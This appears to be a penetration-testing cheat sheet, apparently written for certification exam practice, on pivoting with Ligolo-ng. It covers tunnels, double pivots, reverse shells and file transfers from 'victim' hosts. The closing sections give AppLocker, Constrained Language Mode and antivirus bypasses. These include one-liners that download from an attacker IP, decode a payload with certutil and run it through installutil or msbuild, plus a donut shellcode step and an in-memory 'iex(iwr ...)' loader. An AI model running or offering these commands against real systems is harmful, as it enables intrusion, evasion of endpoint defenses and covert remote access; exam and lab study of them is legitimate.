---
title: Ligolo-ng
sidebar_position: 1
---


### **Normal Instructions**

### **Simple Tunneling**

Keep in mind that we should have already downloaded the proxy to our attacker machine, and have transfer the agent to the victim.

Ligolo Tunnel

![Ligolo Tunnel](https://www.emmanuelsolis.com/img/ligolo_tunnel.png)

1. **Find the network mask**, for example, if your IP address is `X.X.X.X` and the subnet mask is `Y.Y.Y.Y`, the network will be `X.X.X.X/` followed by the subnet prefix. For instance, with a subnet mask of `255.255.255.0`, the network prefix would be `/24`.
2. **Create the interface** for `ligolo` in my Kali

```bash
sudo ip tuntap add user [kali_user] mode tun ligolo

sudo ip link set ligolo up

```

1. **Enable the proxy server** on the attacker machine

```bash
# The option -selfcert is for not using a certificate (this will make our communications in clear text), we do not need to encrypt them for the exam.
./ligolo_proxy_linux -selfcert
or
./ligolo_proxy_linux -selfcert -port <DIFFERENT_PROXY_PORT>

```

1. Download **(bring) the agent** program to the victim (in this example Windows)

```powershell
iwr -uri http://[attacker_ip]/ligolo_agent_windows.exe -UseBasicParsing -Outfile ligolo_agent_windows.exe

```

1. **Start the client**

```powershell
# The port is the default one, we could also change it if needed.
./ligolo_agent_windows.exe -connect [attacker_ip]:11601 -ignore-cert
or
./ligolo_agent_windows.exe -connect [attacker_ip]:<DIFFERENT_PROXY_PORT> -ignore-cert

```

1. **Add the route** in the Kali

```bash
# Run this command in other terminal that from the one where ligolo proxy is running
sudo ip route add [internal_submask]/24 dev ligolo

# Verify routing table
ip route list

```

1. **Finish** setting up the tunneling session

```bash
# Run this commands in the ligolo proxy terminal
» session
» start

# After this the tunneling should be ready, you could perform any command.

```

### **Reverse Shells From Internal Networks**

1. Setup the Netcat listener in our Kali

```bash
nc -nvlp [kali_port]

```

1. Setup a listener for the reverse shell in the Ligolo session

```bash
listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp

```

Ligolo Agent Listener

![Ligolo Agent Listener](https://www.emmanuelsolis.com/img/ligolo_10.png)

1. Run a reverse shell command or a payload created with `msfvenom`

```bash
[command_to_run_reverse_shell] -L [kali_ip]:[kali_port]
or
./payload.exe

```

Ligolo Download

![Ligolo Download](https://www.emmanuelsolis.com/img/ligolo_11.png)

### **Double Tunneling**

In certain cases, the recently compromised host will have two interfaces, enabling you to explore the network further and find more hosts. In this scenario, you'll need to execute a double pivot.

Ligolo Double Tunnel

![Ligolo Double Tunnel](https://www.emmanuelsolis.com/img/ligolo_double_tunnel.png)

1. Add a second interface

```bash
sudo ip tuntap add user [kali_user] mode tun ligolo_double

sudo ip link set ligolo_double up

```

1. Create a listener

```bash
# The next step is to add a listener on port 11601 to our existing Ligolo-ng session and redirect it to our machine.
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

# Verify it's been added
listener_list

```

Ligolo Agent Listener

![Ligolo Agent Listener](https://www.emmanuelsolis.com/img/ligolo_01.png)

1. Connect to the proxy server

```powershell
# Next, we need to execute the agent on the Windows host to connect to the forwarded port on our attacker machine
./agent.exe -connect <IP of First Pivot Point>:11601 -ignore-cert

```

Ligolo Agent Listener

![Ligolo Agent Listener](https://www.emmanuelsolis.com/img/ligolo_02.png)

1. Verify the connection on Kali by checking if the Windows agent has connected via the forwarded port.
    
    Ligolo Agent Joined
    
    ![Ligolo Agent Joined](https://www.emmanuelsolis.com/img/ligolo_03.png)
    
2. Start a tunnel and add a route

```bash
# Our last step is to change our session to the second pivot point (Windows), start the tunnel, and then add a route to the newly discovered network at 10.1.30.0/24.
sudo ip add route <New_Network> dev ligolo_double

```

We'll be able to interact with the new network from our Kali machine and run all the same tools as we did with the single pivot.

Ligolo Agent Session

![Ligolo Agent Session](https://www.emmanuelsolis.com/img/ligolo_04.png)

Ligolo Add New Route

![Ligolo Add New Route](https://www.emmanuelsolis.com/img/ligolo_05.png)

You could continue with a triple pivot using Ligolo-ng, following the same steps as we did with the double pivot.

Ligolo Tunnel Test

![Ligolo Tunnel Test](https://www.emmanuelsolis.com/img/ligolo_06.png)

### **Local Port Forwarding**

Local port forwarding is useful when you encounter an internal server on the victim machine that only accepts connections from the local machine. By using a **special hardcoded IP address**, `Ligolo-ng` facilitates this process; to set up local port forwarding, **follow these steps**:

1. **Ensure Tunneling is Configured**: make sure you have already established the tunneling with `Ligolo-ng` and that your network interface is set up correctly as `ligolo`.
2. **Add the Special IP Address**: use the following command to add a special IP address that `Ligolo-ng` recognizes as the local endpoint for port forwarding.

```bash
# Add a special hardcoded IP for local port forwarding.
sudo ip route add 240.0.0.1/32 dev ligolo

```

**Explanation**

- **`240.0.0.1/32`**: this is a special hardcoded IP address that `Ligolo-ng` understands; by adding this route, you inform the system to route traffic intended for this IP through the `ligolo` interface to the victim machine where the client is running.
- **`dev ligolo`**: this specifies the device (or network interface) through which the routing will occur, ensuring that all traffic directed to `240.0.0.1` is channeled through the established tunnel.

**Examples**: just with that command we can now connect to the internal services of the victim machine, either by using commands or other types of services like HTTP.

```bash
┌──(poiint㉿Kali)-[~]
└─$ nmap 240.0.0.1 -sV

PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))631/tcp open ipp CUPS 2.2
3306/tcp open mysql MySQL 5.7.29-0ubuntu0.18.04.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Ligolo Port Forwarding

![Ligolo Port Forwarding](https://www.emmanuelsolis.com/img/ligolo_port_forwarding.png)

### **File Transfers From Internal Networks**

1. Setup a listener in the Ligolo session

```bash
listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp

```

Ligolo Agent Listener

![Ligolo Agent Listener](https://www.emmanuelsolis.com/img/ligolo_07.png)

1. Host the file in our Kali

```bash
python3 -m http.server [kali_port]

```

HTTP Server

![HTTP Server](https://www.emmanuelsolis.com/img/ligolo_08.png)

1. Download the file on the compromised Windows host

```powershell
Invoke-WebRequest -Uri "http://[agent_ip]:[agent_port]/[file_name]" -OutFile [file_name]

```

HTTP Server

![HTTP Server](https://www.emmanuelsolis.com/img/ligolo_08.png)

### **AV Bypassing**

### **Agent AppLocker Bypass**

- [GitHub Reference](https://github.com/LorisDietrich/ApplockerBypassExternalBinary)

**Steps**

1. Modify the file `/ligolo-ng/cmd/agent/main.go`, like below so that it points to your IP.
    
    Ligolo Code Modification
    
    ![Ligolo Code Modification](https://www.emmanuelsolis.com/img/ligolo1.png)
    
2. Compile the code

```bash
# From Kali
GOOS=windows go build -o agent.exe cmd/agent/main.go

```

1. Here you have two options, use the already compile file `ApplockerBypassExternalBinary.exe` from the GitHub or build you own using the solution provided in the folder `ApplockerBypassExternalBinary`, if you are building your own executable do the following:
    1. Add required reference: Add the System.Configuration.Install reference to the project.
    2. Compile the project: Ensure the project is compiled as **Release** and **x64** for compatibility.
2. Encode the executable with `certutil`

```powershell
# From Windows
certutil -encode .\ApplockerBypassExternalBinary.exe AppLockerBypassLigolo.txt

```

1. Rename `agent.exe` to `ligolo-agent.exe`
2. Download and execute from victim

```powershell
# Option 1 - curl
cmd.exe /c "curl http://[ATTACKER_IP]/ligolo-agent.exe -o C:\users\public\try-agent.exe && curl http://[ATTACKER_IP]/AppLockerBypassLigolo.txt -o C:\users\public\enc.txt && certutil -decode C:\users\public\enc.txt C:\users\public\ligolo.exe && del C:\users\public\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=true /U C:\users\public\ligolo.exe"

# Option 2 - bitsadmin
cmd.exe /c "bitsadmin /Transfer myJob http://[ATTACKER_IP]/ligolo-agent.exe C:\users\public\try-agent.exe && cmd /c bitsadmin /Transfer myJob http://[ATTACKER_IP]/pyhttp/AppLockerBypassLigolo.txt C:\users\public\enc.txt && certutil -decode C:\users\public\enc.txt C:\users\public\ligolo.exe && del C:\users\public\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=true /U C:\users\public\ligolo.exe"

```

### **Agent CLM Bypass**

- [GitHub Reference](https://github.com/emmasolis1/OSEP)

**Steps**

1. Update `ligolo.ps1` on line 14 and put our IP Address.
2. Update `ligolo-clmbypass.xml` on line 36 and put our IP Address.
3. Download `ligolo-clmbypass.xml` and execute it from the victim

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe ligolo-clmbypass.xml

```

1. (Optional) If this script `ligolo.ps1` is caught by the AV, use the `ligolo-psrunner.ps1` as alternative as it uses NT APIs only with sleeps between sensitive operations.

### **Agent Shellcode Runner**

- [GitHub Reference](https://github.com/emmasolis1/OSEP)

**Requirements**

- Agent for victim: `agent.exe`
- File `ligolo.ps1`
- Running in a x64bit process, check with:
    - Powershell: `[Environment]::Is64BitProcess`
    - CMD: `set p` (Should show `PROCESSOR_ARCHITECTURE=AMD64`)

**Steps**

1. Convert `agent.exe` to shellcode

```bash
# From Kali
donut -f 1 -o agent.bin -a 2 -p "-connect [ATTACKER_IP]:11601 -ignore-cert" -i agent.exe

```

1. Update `ligolo.ps1` on line 14 and put our IP Address.
2. (Optional) If this script `ligolo.ps1` is caught by the AV, use the `ligolo-psrunner.ps1` as alternative as it uses NT APIs only with sleeps between sensitive operations.
3. Download and execute Ligolo from the victim

```powershell
# Direct memory loading
iex(iwr http://[ATTACKER_IP]/ligolo.ps1 -UseBasicParsing)

```
